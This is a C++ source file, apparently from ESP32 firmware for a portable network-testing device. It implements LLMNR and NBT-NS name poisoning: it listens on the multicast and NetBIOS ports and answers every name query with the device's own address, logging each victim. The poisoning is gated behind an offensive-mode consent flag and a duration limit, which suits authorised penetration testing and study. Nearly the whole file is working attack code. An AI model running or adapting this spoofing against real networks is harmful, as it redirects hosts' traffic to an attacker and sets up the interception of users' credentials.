#include "NameSpoofManager.h"
#include <WiFiUdp.h>
#include "../net/WifiManager.h"
#include "../net/LlmnrWire.h"
#include "../net/NbnsWire.h"
#include "../core/Config.h"

NameSpoofManager g_nameSpoofManager;

void NameSpoofManager::begin(QueueHandle_t outQueue) {
    _mutex = xSemaphoreCreateMutex();
    _outQueue = outQueue;
}

bool NameSpoofManager::start(uint16_t durationS) {
    if (_running) return false;
    // Defense in depth: NAME SPOOF is a gated top-level menu entry
    // (reached through OffensiveDisclaimerScreen), but never answer
    // name queries LAN-wide unless the per-boot consent flag is set.
    if (!g_config.offensiveEnabled) return false;
    if (durationS > kMaxDurationS) durationS = kMaxDurationS;
    if (durationS == 0) durationS = 1;

    if (_mutex && xSemaphoreTake(_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
        _log.clear();
        xSemaphoreGive(_mutex);
    }
    _poisoned = 0;
    _startMs = millis();
    _durationMs = (uint32_t)durationS * 1000UL;
    _running = true;
    notify(ScanEventType::ScanStarted);
    if (xTaskCreatePinnedToCore(&NameSpoofManager::taskEntry, "namespoof", 4096, this, 1, nullptr, 0) != pdPASS) {
        // Task never started (out of memory) - clear the running flag so
        // the UI doesn't sit on a session with nothing behind it.
        _running = false;
        notify(ScanEventType::ScanFinished, 100);
        return false;
    }
    return true;
}

void NameSpoofManager::stop() {
    _running = false;  // run() notices on its next loop iteration and closes the sockets
}

uint32_t NameSpoofManager::secondsRemaining() const {
    if (!_running) return 0;
    uint32_t elapsed = millis() - _startMs;
    if (elapsed >= _durationMs) return 0;
    return (_durationMs - elapsed) / 1000;
}

void NameSpoofManager::taskEntry(void* arg) {
    static_cast<NameSpoofManager*>(arg)->run();
    vTaskDelete(nullptr);
}

void NameSpoofManager::run() {
    IPAddress selfIp = g_wifi.localIP();

    WiFiUDP llmnrUdp;
    WiFiUDP nbnsUdp;
    // See net/MdnsReverseResolver.cpp's RISK note on this same 2-arg
    // beginMulticast(multicastAddr, port) overload - Arduino-ESP32's
    // WiFiUdp has carried it across the core versions this project
    // targets, unlike the 3-arg ESP8266-style signature.
    bool llmnrOk = llmnrUdp.beginMulticast(IPAddress(224, 0, 0, 252), 5355);
    bool nbnsOk = nbnsUdp.begin(137);

    if (!llmnrOk && !nbnsOk) {
        log("failed to open LLMNR/NBT-NS sockets");
        _running = false;
        notify(ScanEventType::ScanFinished, 100);
        return;
    }
    if (!llmnrOk) log("LLMNR socket failed - NBT-NS only");
    if (!nbnsOk) log("NBT-NS socket failed - LLMNR only");

    uint8_t buf[600];
    while (_running && secondsRemaining() > 0) {
        if (llmnrOk) {
            int size = llmnrUdp.parsePacket();
            if (size > 0 && size < (int)sizeof(buf)) {
                int n = llmnrUdp.read(buf, sizeof(buf));
                uint16_t id, qtype;
                String name;
                if (n > 0 && llmnrwire::parseQuery(buf, (size_t)n, id, name, qtype) && qtype == 1) {
                    auto resp = llmnrwire::buildResponse(buf, (size_t)n, selfIp);
                    if (!resp.empty()) {
                        IPAddress from = llmnrUdp.remoteIP();
                        uint16_t fromPort = llmnrUdp.remotePort();
                        llmnrUdp.beginPacket(from, fromPort);
                        llmnrUdp.write(resp.data(), resp.size());
                        llmnrUdp.endPacket();
                        _poisoned++;
                        log("LLMNR '" + name + "' <- " + from.toString());
                    }
                }
            }
        }

        if (nbnsOk) {
            int size = nbnsUdp.parsePacket();
            if (size > 0 && size < (int)sizeof(buf)) {
                int n = nbnsUdp.read(buf, sizeof(buf));
                uint16_t txnId;
                String name;
                if (n > 0 && nbnswire::parseQuery(buf, (size_t)n, txnId, name)) {
                    auto resp = nbnswire::buildResponse(buf, (size_t)n, selfIp);
                    if (!resp.empty()) {
                        IPAddress from = nbnsUdp.remoteIP();
                        nbnsUdp.beginPacket(from, 137);
                        nbnsUdp.write(resp.data(), resp.size());
                        nbnsUdp.endPacket();
                        _poisoned++;
                        log("NBT-NS '" + name + "' <- " + from.toString());
                    }
                }
            }
        }

        delay(20);
    }

    llmnrUdp.stop();
    nbnsUdp.stop();
    _running = false;
    log("stopped - " + String((unsigned)_poisoned) + " quer" + String(_poisoned == 1 ? "y" : "ies") + " answered");
    notify(ScanEventType::ScanFinished, 100);
}

void NameSpoofManager::log(const String& text) {
    if (_mutex && xSemaphoreTake(_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
        LogEntry e;
        e.text = text;
        e.atMs = millis();
        if (_log.size() >= kMaxLogEntries) _log.erase(_log.begin());
        _log.push_back(e);
        xSemaphoreGive(_mutex);
    }
    notify(text);
}

void NameSpoofManager::notify(const String& text) {
    if (!_outQueue) return;
    ScanNotification n;
    n.source = ScanSource::NameSpoof;
    n.type = ScanEventType::LogLine;
    n.setText(text.c_str());
    xQueueSend(_outQueue, &n, 0);
}

void NameSpoofManager::notify(ScanEventType type, uint8_t pct) {
    if (!_outQueue) return;
    ScanNotification n;
    n.source = ScanSource::NameSpoof;
    n.type = type;
    n.progressPct = pct;
    xQueueSend(_outQueue, &n, 0);
}

size_t NameSpoofManager::logCount() const {
    if (!_mutex || xSemaphoreTake(_mutex, pdMS_TO_TICKS(100)) != pdTRUE) return 0;
    size_t n = _log.size();
    xSemaphoreGive(_mutex);
    return n;
}

bool NameSpoofManager::getLogEntry(size_t index, LogEntry& out) const {
    if (!_mutex || xSemaphoreTake(_mutex, pdMS_TO_TICKS(100)) != pdTRUE) return false;
    bool ok = index < _log.size();
    if (ok) out = _log[_log.size() - 1 - index];
    xSemaphoreGive(_mutex);
    return ok;
}
